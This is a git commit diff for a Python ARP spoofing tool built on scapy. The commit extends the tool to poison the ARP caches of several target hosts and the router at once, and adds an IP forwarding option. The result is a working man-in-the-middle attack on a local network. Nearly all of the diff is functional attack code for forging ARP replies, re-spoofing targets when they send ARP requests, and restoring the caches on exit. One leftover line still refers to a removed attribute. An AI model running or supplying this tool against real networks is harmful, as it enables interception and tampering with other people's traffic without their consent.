53125fd25da9e3decdaf5e2d45f81585bc314dd3
szabo-tibor <69170493+szabo-tibor@users.noreply.github.com>
2021-02-08 22:21:32 -0500

    Added support for multiple targets, IP forwarding option

--- aspoof.py
+++ aspoof.py
@@ -5,18 +5,18 @@ from argparse import ArgumentParser
 
 class Spoof:
 
-    def __init__(self,targetip,routerip,mac=None,ip_forward=False):
-        #TODO: Support for multiple targets
+    def __init__(self,targetips: list,routerip,mac=None,ip_forward=False):
+
         self.mymac = mac
-        self.targetip = targetip
         self.routerip = routerip
+        self.routermac = self.getMac(self.routerip)
+        self.targets = {}
         
         try:
-            self.targetmac = self.getMac(self.targetip)
-            self.routermac = self.getMac(self.routerip)
+            for ip in targetips:
+                self.targets[ip] = self.getMac(ip)
 
         except IndexError:
-            pass
             raise Exception("Couldn't get targets MAC address")
 
         if ip_forward:
@@ -34,9 +34,16 @@ class Spoof:
     def spoof(self,target_ip,target_mac,spoof_ip,attacker_mac=None):
 
         if attacker_mac is None:
-            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip)
+            packet = scapy.ARP(op = 2,
+                               pdst = target_ip,
+                               hwdst = target_mac,
+                               psrc = spoof_ip)
         else:
-            packet = scapy.ARP(op = 2,pdst = target_ip,hwdst = target_mac,psrc = spoof_ip,hwsrc = attacker_mac)
+            packet = scapy.ARP(op = 2,
+                               pdst = target_ip,
+                               hwdst = target_mac,
+                               psrc = spoof_ip,
+                               hwsrc = attacker_mac)
 
         scapy.send(packet, verbose = False)
 
@@ -46,8 +53,10 @@ class Spoof:
             print("Your MAC: Default")
         else:
             print("Your MAC:", self.mymac)
-        print("Target IP:", self.targetip)
-        print("Target MAC:", self.targetmac)
+        for host in self.targets:
+            print("Target IP:", host)
+            print("Target MAC:", self.targets.get(host))
+
         print("Router IP:", self.routerip)
         print("Router MAC:", self.routermac)
 
@@ -56,16 +65,16 @@ class Spoof:
 
         if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:
 
-            if pkt.psrc == self.targetip and pkt.pdst == self.routerip:
-                print(self.targetip, "is asking for", self.routerip, ", sending spoofed replies...")
+            if pkt.psrc in self.targets and pkt.pdst == self.routerip:
+                print(pkt.psrc, "is asking for", pkt.pdst, ", sending spoofed replies...")
                 for x in range(5):
-                    self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
+                    self.spoof(pkt.psrc,self.targets[pkt.psrc],self.routerip,self.mymac)
                     sleep(0.5)
 
-            if pkt.psrc == self.routerip and pkt.pdst == self.targetip:
+            if pkt.psrc == self.routerip and pkt.pdst in self.targets:
                 print(self.routerip, "is asking for", self.targetip, ", sending spoofed replies...")
                 for x in range(5):
-                    self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
+                    self.spoof(self.routerip,self.routermac,pkt.pdst,self.mymac)
                     sleep(0.5)
 
     def arpTrigger(self,pkt):
@@ -93,25 +102,52 @@ class Spoof:
     def start(self):
 
         for x in range(5):
-            self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
-            self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
+            for host in self.targets:
+                self.spoof(host,self.targets[host],self.routerip,self.mymac)
+                self.spoof(self.routerip,self.routermac,host,self.mymac)
+
             sleep(0.5)
 
-        f = "host {} and host {} and arp".format(self.targetip,self.routerip)
+
+        f = "arp"
+        for host in self.targets:
+            f += " and host {}".format(host)
+
+
         scapy.sniff(prn=self.arpTrigger, filter=f, store=0)
 
         print("\nResetting ARP cache and exiting...")
-        self.spoof(self.targetip,self.targetmac,self.routerip,self.routermac)
-        self.spoof(self.routerip,self.routermac,self.targetip,self.targetmac)
+        for host in self.targets:
+            self.spoof(host,self.targets[host],self.routerip,self.routermac)
+            self.spoof(self.routerip,self.routermac,host,self.targets[host])
+
 
         
 def main():
     parser = ArgumentParser(description="Spoof ARP replies on your LAN")
-    parser.add_argument("-t", "--target", help="IP Address of target", required=True)
-    parser.add_argument("-r", "--router", help="IP Address of router (optional)", default=scapy.conf.route.route("0.0.0.0")[2])
-    parser.add_argument("-m", "--mac", help="Manually set your mac address (optional)", default=None)
+    
+    parser.add_argument("-t",
+                        "--target",
+                        help="Target IP, or comma-separated IPs, e.g. 192.168.1.7,192.168.1.8",
+                        required=True)
+    
+    parser.add_argument("-r",
+                        "--router",
+                        help="IP Address of router (optional)",
+                        default=scapy.conf.route.route("0.0.0.0")[2])
+    
+    parser.add_argument("-m",
+                        "--mac",
+                        help="Manually set your mac address (optional)",
+                        default=None)
+    parser.add_argument("-fw",
+                        "--forward",
+                        help="Enable IP Forwarding (currently only supported on Linux based operating systems",
+                        default=False,
+                        action="store_true")
+    
     cli_input = parser.parse_args()
-    spoofer = Spoof(cli_input.target,cli_input.router,cli_input.mac)
+    spoofer = Spoof(cli_input.target.split(","),cli_input.router,cli_input.mac,cli_input.forward)
     spoofer.showOptions()
     spoofer.start()
 
